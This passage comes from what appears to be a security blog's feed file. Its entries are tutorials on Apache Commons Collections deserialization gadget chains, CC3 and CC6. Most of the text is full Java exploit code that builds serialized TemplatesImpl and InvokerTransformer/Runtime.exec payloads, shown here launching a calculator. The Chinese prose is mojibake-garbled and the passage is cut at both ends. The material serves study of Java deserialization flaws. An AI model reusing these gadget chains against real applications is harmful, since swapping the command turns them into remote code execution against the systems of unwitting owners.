class_">CC3EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//ä¸CC1å‰åŠéƒ¨åˆ†é“¾å­ç»“åˆä¸€ä¸‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ– AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-comment">//æ–°å»ºåŠ¨æ€ä»£ç†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// æ–°å»ºAnnotationInvocationHandlerå®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, mapProxy);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC3/C14.png"></p><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>CC3é“¾ä¸å‰é¢é“¾å­ä¸åŒä¹‹å¤„ä¸»è¦åœ¨äºå‘½ä»¤æ‰§è¡Œåˆ©ç”¨çš„ç±»ä¸åŒ</p><p>CC3ä¸»è¦åˆ©ç”¨äº†defineæ–¹æ³•ä»å¤–éƒ¨åŠ è½½classæ–‡ä»¶æ‰§è¡Œæ¶æ„ä»£ç ï¼ŒInvokertransformç±»è¢«æ”¾å…¥é»‘åå•åï¼Œå¯ä»¥åˆ©ç”¨CC3é“¾</p><p>ä¸CC1é“¾å­ç»“åˆ</p><p><img src="/img/CC3/CC3.png"></p><p>CC3é“¾ä¸å‰å‡ æ¡é“¾å­ä¸åŒä¹‹å¤„</p><p><img src="/img/CC3/CC3.png"></p><p>æ˜¯è¿™éƒ¨åˆ†ä»£æ›¿äº†Invokertransformç±»çš„å‘½ä»¤æ‰§è¡Œ</p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-CC6é“¾</title>
    <link href="/2025/09/05/Java%E5%AE%89%E5%85%A8-CC6%E9%93%BE/"/>
    <url>/2025/09/05/Java%E5%AE%89%E5%85%A8-CC6%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC6é“¾"><a href="#Javaå®‰å…¨-CC6é“¾" class="headerlink" title="Javaå®‰å…¨-CC6é“¾"></a>Javaå®‰å…¨-CC6é“¾</h1><p> CC6 é“¾å¯ä»¥ä¸å— jdk ç‰ˆæœ¬åˆ¶çº¦ï¼Œé€‚ç”¨èŒƒå›´éå¸¸å¹¿ï¼Œå¯ä»¥è¯´æ˜¯æœ€å¥½ç”¨çš„é“¾</p><p>CC6 é“¾çš„å‰åŠæ¡é“¾ä¸ CC1 æ­£ç‰ˆé“¾å­æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯åˆ° LazyMap é“¾</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li>Jdk 8u65</li><li>Comoons-Collections 3.2.1</li></ul><h2 id="CC6-é“¾åˆ†æ"><a href="#CC6-é“¾åˆ†æ" class="headerlink" title="CC6 é“¾åˆ†æ"></a>CC6 é“¾åˆ†æ</h2><h3 id="æ‰¾é“¾å­"><a href="#æ‰¾é“¾å­" class="headerlink" title="æ‰¾é“¾å­"></a>æ‰¾é“¾å­</h3><ul><li>å› ä¸ºå‰åŠæ®µé“¾å­ï¼Œ<code>LazyMap</code> ç±»åˆ° <code>InvokerTransformer</code> ç±»æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ç›´æ¥åˆ° <code>LazyMap</code> ä¸‹ã€‚</li></ul><p>æˆ‘ä»¬è¿˜æ˜¯æ‰¾å…¶ä»–è°ƒç”¨ <code>get()</code> æ–¹æ³•çš„åœ°æ–¹</p><p>è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°äº†<code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code> æ–¹æ³•</p><p><img src="/img/CC6/c01.png"></p><p>æ–°å»ºä¸€ä¸ªTiedMapEntryçš„å®ä¾‹å¹¶è°ƒç”¨getValueæ–¹æ³•ï¼Œå‰é¢é“¾å­çš„å†…å®¹æ˜¯ä¸CC1ç›¸åŒçš„ï¼Œæ— éœ€æ”¹åŠ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//å±é™©å‚æ•°æ„é€ </span><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//ç”ŸæˆLazyMapå®ä¾‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//æ–°å»ºTiedMapEntryå®ä¾‹</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-number">1</span>);<br>        tiedMapEntry.getValue();<br>    &#125;<br>&#125;    <br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæ˜¯å¯ä»¥æ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨çš„</p><p>ç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥æ‰¾åˆ°åŒä¸€ä¸ªç±»ä¸­hashcodeæ–¹æ³•è°ƒç”¨äº†getValueæ–¹æ³•</p><p><img src="/img/CC6/c02.png"></p><h3 id="å…¥å£ç±»"><a href="#å…¥å£ç±»" class="headerlink" title="å…¥å£ç±»"></a>å…¥å£ç±»</h3><p>è¿™é‡Œæ˜¯å¯ä»¥å‚è€ƒURLDNSè¿™æ¡é“¾çš„</p><p>å›é¡¾URLDNSçš„åˆ©ç”¨é“¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Gadget Chain:<br>HashMap.readObject()<br>HashMap.put()<br>HashMap.<span class="hljs-built_in">hash</span>()<br>URL.hashCode()<br></code></pre></td></tr></table></figure><p>å…¶å®HashMapå…¥å£ç±»è¿™é‡Œæ˜¯å¯ä»¥é€šç”¨çš„</p><p>åœ¨ Java ååºåˆ—åŒ–å½“ä¸­ï¼Œæ‰¾åˆ° <code>hashCode()</code> ä¹‹åçš„é“¾å­ç”¨çš„åŸºæœ¬éƒ½æ˜¯è¿™ä¸€æ¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">xxx.readObject()<br>HashMap.put() --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash()<br>åç»­åˆ©ç”¨é“¾.hashCode()<br></code></pre></td></tr></table></figure><p>ç¼–å†™EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//å±é™©å‚æ•°æ„é€ </span><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//ç”ŸæˆLazyMapå®ä¾‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//æ–°å»ºTiedMapEntryå®ä¾‹</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-number">1</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨ <code>HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</code> è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œä¼šå‘ç°ç›´æ¥ <code>tiedMapEntry.getValue();</code>å°±å¼¹è®¡ç®—å™¨äº†ï¼Œä¸è¦ç€æ€¥ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ª IDEA çš„å°å‘</p><h3 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h3><h4 id="é—®é¢˜ä¸€ï¼š-IDEA-çš„å°å‘"><a href="#é—®é¢˜ä¸€ï¼š-IDEA-çš„å°å‘" class="headerlink" title="é—®é¢˜ä¸€ï¼š IDEA çš„å°å‘"></a>é—®é¢˜ä¸€ï¼š IDEA çš„å°å‘</h4><p>æˆ‘ä»¬åœ¨<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;zac&quot;);</code>æ‰“æ–­ç‚¹å¯ä»¥çœ‹åˆ°ï¼Œåœ¨èµ°å…¥æ„é€ æ–¹æ³•æ—¶ï¼Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨äº†</p><p><img src="/img/CC6/c03.png"></p><h5 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h5><p>è¿™æ˜¯å› ä¸ºåœ¨ IDEA è¿›è¡Œ debug è°ƒè¯•çš„æ—¶å€™ï¼Œä¸ºäº†å±•ç¤ºå¯¹è±¡çš„é›†åˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code> æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åˆ›å»º <code>TiedMapEntry</code> çš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨è°ƒç”¨äº† <code>getValue()</code> æœ€ç»ˆå°†é“¾å­èµ°å®Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="/img/CC6/c04.png"></p><h5 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h5><p>åœ¨ IDEA çš„åå¥½è®¾ç½®å½“ä¸­å¦‚å›¾ä¿®æ”¹å³å¯</p><p><img src="/img/CC6/c05.png"></p><h4 id="é—®é¢˜äºŒï¼šåºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±èƒ½å¤Ÿå¼¹å‡ºè®¡ç®—å™¨"><a href="#é—®é¢˜äºŒï¼šåºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±èƒ½å¤Ÿå¼¹å‡ºè®¡ç®—å™¨" class="headerlink" 